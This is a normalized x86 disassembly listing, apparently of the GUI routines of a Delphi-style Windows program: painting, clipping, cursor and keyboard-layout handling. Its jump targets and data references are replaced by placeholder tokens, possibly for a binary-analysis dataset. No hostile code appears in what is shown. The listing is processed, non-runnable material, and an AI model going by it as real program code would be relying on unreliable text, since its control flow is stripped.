call sub_44d7a4
push eax
call EndPaint
inc esi
dec edi
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
push edx
mov eax [ eax + 0x40 ]
push eax
push ebx
call ExcludeClipRect
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x1
je r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_41b654
cmp [ eax + 0x57 ] 0x0
jne r-xdata
sub_44b578
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebx ecx
mov ebp edx
mov esi eax
cmp [ esi + 0x1a8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
mov eax [ esi + 0x19c ]
test eax eax
je r-xdata
xor edi edi
test ebx ebx
je r-xdata
cmp [ esi + 0x17c ] 0x0
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ esi + 0x198 ]
mov eax [ eax + 0x8 ]
mov [ esp ] eax
cmp edi [ esp ]
jge r-xdata
mov edx ebx
call sub_41b6b0
mov edi eax
test edi edi
jge r-xdata
mov eax [ esi + 0x17c ]
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x20 ]
inc eax
mov [ esp + 0xc ] eax
xor edi edi
mov eax [ esi + 0x198 ]
mov edx edi
call sub_41b654
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor edi edi
inc edi
dec [ esp + 0xc ]
jne r-xdata
test [ ebx + 0x50 ] 0x10
je r-xdata
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x14 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_41a018
lea eax [ esp + 0x10 ]
push eax
push ebp
call RectVisible
test eax eax
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax [ esi + 0x19c ]
mov edx edi
call sub_41b654
mov ebx eax
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
inc edi
cmp edi [ esp ]
jl r-xdata
test [ esi + 0x54 ] 0x80
je r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
mov eax 0xff000010
call sub_42697c
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
dec edx
mov eax [ ebx + 0x40 ]
dec eax
call sub_41a018
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
mov eax 0xff000014
call sub_42697c
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
inc eax
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
inc ecx
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_41a018
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
test [ ebx + 0x1c ] 0x10
je r-xdata
push ebp
call SaveDC
mov [ esp + 0x4 ] eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebp
call sub_4458c0
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push ebp
call IntersectClipRect
push 0x0
mov ecx ebp
mov edx 0xf
mov eax ebx
call sub_448138
mov eax [ esp + 0x4 ]
push eax
push ebp
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
or [ ebx + 0x54 ] 0x80
test [ ebx + 0x51 ] 0x4
jne r-xdata
sub_44b7a8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x80
push esi
call SaveDC
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
call sub_4458c0
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor edi edi
xor eax eax
mov [ ebp - 0x8 ] eax
push 0xffffffec
mov eax ebx
call sub_44d7a4
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
push 0xfffffff0
mov eax ebx
call sub_44d7a4
push eax
call GetWindowLongA
test eax 0x800000
je r-xdata
mov [ ebp - 0x8 ] 0xa
mov edi 0x200f
jmp r-xdata
test edi edi
je r-xdata
mov [ ebp - 0x8 ] 0x3
mov edi 0xa00f
push 0x0
mov ecx esi
mov edx 0x14
mov eax ebx
call sub_448138
push 0x0
mov ecx esi
mov edx 0xf
mov eax ebx
call sub_448138
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x20 ]
push eax
call SetRect
push edi
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push esi
call DrawEdge
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_4458c0
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
mov eax [ ebp - 0xc ]
push eax
push esi
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ eax + 0x44 ]
push edx
mov ecx [ eax + 0x40 ]
mov edx esi
call sub_44b7a8
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x19c ]
call sub_41b654
cmp [ eax + 0x57 ] 0x0
je r-xdata
sub_44b8fc
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
test [ ebx + 0x55 ] 0x1
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44b420
jmp r-xdata
mov eax ebx
call sub_44a49c
test eax eax
jne r-xdata
push 0x0
call GetDC
mov edi eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push edi
call CreateCompatibleBitmap
mov [ ebp - 0x8 ] eax
push edi
push 0x0
call ReleaseDC
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44ba4e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_44d7a4
push eax
call BeginPaint
mov edi eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx 0x14
mov eax ebx
call sub_448138
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov edx esi
mov eax ebx
call sub_44b8fc
xor eax eax
mov [ esi + 0x4 ] eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push 0x0
push 0x0
push edi
call BitBlt
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_44d7a4
push eax
call EndPaint
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call DeleteObject
retn
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
sub_44ba5c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44b3ec
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44ba7c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_44b3ec
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44baf0
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44b3ec
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44bb10
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44b3ec
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44bb30
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44b3ec
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44bb54
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44b3ec
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44bb78
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44b3ec
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44bb9c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44b3ec
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44bbc0
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
call sub_43a564
mov edi eax
mov eax edi
call sub_43a644
test al al
je r-xdata
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x170 ]
call sub_42763c
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
test [ ebx + 0x52 ] 0x4
je r-xdata
mov [ esi + 0xc ] 0x1
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_44d7a4
mov edx eax
mov ecx [ esi + 0x4 ]
mov eax edi
call sub_43a744
jmp r-xdata
sub_44bc48
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
cmp [ edi + 0x1a5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x50 ] 0x10
je r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x2
jne r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x8
je r-xdata
mov [ esp ] al
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov al 0x1
mov bl 0x1
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x1 ] al
test bl bl
je r-xdata
mov al 0x1
test [ edi + 0x55 ] 0x2
jne r-xdata
mov al [ esp ]
or al [ esp + 0x1 ]
je r-xdata
mov edx esi
mov eax edi
call sub_448a6c
test bl bl
je r-xdata
mov eax edi
call sub_44dab4
mov eax edi
call sub_44d6ac
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
or al [ esp + 0x1 ]
jne r-xdata
mov eax edi
call sub_44d6ac
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0xc0
je r-xdata
sub_44bd08
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
pop ebx
retn
mov esi [ edi + 0x8 ]
test [ esi + 0x18 ] 0x1
jne r-xdata
lea ecx [ esi + 0x14 ]
lea edx [ esi + 0x10 ]
mov eax ebx
call sub_4486c8
test al al
jne r-xdata
or [ esi + 0x18 ] 0x1
sub_44bd58
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44dab4
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_44a02c
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffcf
call sub_40358c
sub_44bda0
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x180 ]
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ esi + 0x8 ]
sub ax 0xfffe
je r-xdata
cmp [ esi + 0xa ] 0x201
jne r-xdata
sub ax 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov di [ eax + 0x44 ]
test di di
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
call GetLastActivePopup
mov edi eax
call GetForegroundWindow
cmp edi eax
je r-xdata
test di di
je r-xdata
push esp
call GetCursorPos
push 0x0
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_446ac8
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_44b058
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4665c0
jmp r-xdata
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_464aa8
push eax
call SetCursor
mov [ esi + 0xc ] 0x1
jmp r-xdata
test di di
jne r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov di [ eax + 0x78 ]
mov di 0xfffe
jmp r-xdata
mov di [ ebx + 0x78 ]
mov di 0xfffe
jmp r-xdata
sub_44bef0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_44bfcf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bfd6
lea eax [ ebp - 0x4 ]
call sub_404120
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
mov eax ebx
call sub_44d7a4
mov dl [ ebx + 0x184 ]
call sub_4523e4
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_464a20
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_4082e8
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_464820
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x3c ]
cmp [ ebx + 0x184 ] 0x0
je r-xdata
push 0x1
push esi
call ActivateKeyboardLayout
mov eax [ rw-data ]
mov eax [ eax ]
call sub_464820
mov edx [ ebx + 0x188 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edi eax
test edi edi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_464820
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
sub_44bfdc
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_44c066
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c06d
lea eax [ ebp - 0x4 ]
call sub_404120
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
cmp [ ebx + 0x184 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_464a20
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_4082e8
test eax eax
je r-xdata
mov eax ebx
call sub_44d7a4
mov dl 0x1
call sub_4523c8
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
call ActivateKeyboardLayout
sub_44c0c8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dx [ ebp + 0x8 ]
mov eax edi
call sub_41a008
push eax
mov ecx esi
mov edx 0xb038
mov eax ebx
call sub_448138
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
cmp [ ebx + 0x1b2 ] 0x0
je r-xdata
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
sub_44c118
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1ba ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0xc
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
sub_44c14c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov si 0xffd2
call sub_40358c
mov eax [ ebp + 0x10 ]
push eax
mov al [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
mov si 0xffc3
call sub_40358c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_44c18c
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
cmp [ ebx + 0x1f2 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esi
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1f4 ]
call [ ebx + 0x1f0 ]
xor eax eax
jmp r-xdata
push edi
mov ecx esi
mov edx 0xb039
mov eax ebx
call sub_448138
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_44c1e4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_423fb0
mov edx [ r-xdata ]
call sub_403540
mov [ edi ] eax
pop edi
pop esi
pop ebx
retn
sub_44c21c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x178 ]
test esi esi
je r-xdata
xor eax eax
mov edx edi
mov eax esi
call sub_41b654
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44c240
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov edi edx
mov ebx eax
push esi
mov eax ebx
call sub_44d7a4
push eax
call GetWindowRect
push 0xa
push 0xa
push esi
call InflateRect
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
push esi
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
sub_44c29c
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_44c208
mov edi eax
test edi edi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov ebx edi
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_41b654
cmp [ eax + 0x57 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec edi
sub_44c2dc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x17c ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x17c ]
call sub_405b68
cmp [ ebx + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
cmp [ esi ] 0x0
jne r-xdata
cmp [ ebx + 0x1a7 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x24 ]
mov edx eax
test edx edx
je r-xdata
mov [ ebx + 0x1f8 ] al
pop esi
pop ebx
retn
mov eax esi
call sub_405b68
jmp r-xdata
sub edx 0xffffff8c
cmp [ ebx + 0x1f8 ] 0x0
jne r-xdata
sub_44c348
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_44c3f0
push [ fs : eax ]
mov [ fs : eax ] esp
cmp bl [ edi + 0x1a8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c3f7
lea eax [ ebp - 0x4 ]
call sub_405b50
retn
mov [ edi + 0x1a8 ] bl
test [ edi + 0x1c ] 0x10
jne r-xdata
mov edx ebx
mov eax edi
call sub_444c30
test bl bl
jne r-xdata
cmp [ edi + 0x178 ] 0x0
jne r-xdata
mov eax [ edi + 0x178 ]
call sub_403390
xor eax eax
mov [ edi + 0x178 ] eax
lea eax [ edi + 0x17c ]
call sub_405b50
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffc6
call sub_40358c
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x17c ]
call sub_405b68
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ edi + 0x178 ] eax
sub_44c400
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x2
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44d7a4
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x4 ]
call sub_44a004
xor edx edx
push ebp
push sub_44c4c2
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x38 ]
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov si 0xffcc
call sub_40358c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c4c9
mov eax [ ebp - 0x4 ]
call sub_44a00c
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x58 ]
push edx
mov edx [ ebp - 0x8 ]
mov cl [ eax + 0x54 ]
mov edx [ ebp - 0x8 ]
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
sub_44c4c9
mov eax [ ebp - 0x4 ]
call sub_45dd9c
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4471e4
sub_44c514
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4032d8
cmp esi eax
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_448df8
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x57 ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_44c57e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8 ]
lea ecx [ eax + 0x44 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov si 0xffcc
call sub_40358c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x4 ]
call sub_4471e4
sub_44c598
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1da ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1dc ]
call [ ebx + 0x1d8 ]
sub_44c5c0
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_45dd9c
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_45dca4
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbc
call sub_40358c
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_44c5c0
test al al
jne r-xdata
sub_44c628
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44c5c0
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_44e8f0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44c654
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44c5c0
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_44e8f0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44c680
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1ea ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1ec ]
call [ ebx + 0x1e8 ]
sub_44c6a8
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_45dd9c
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_45dca4
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
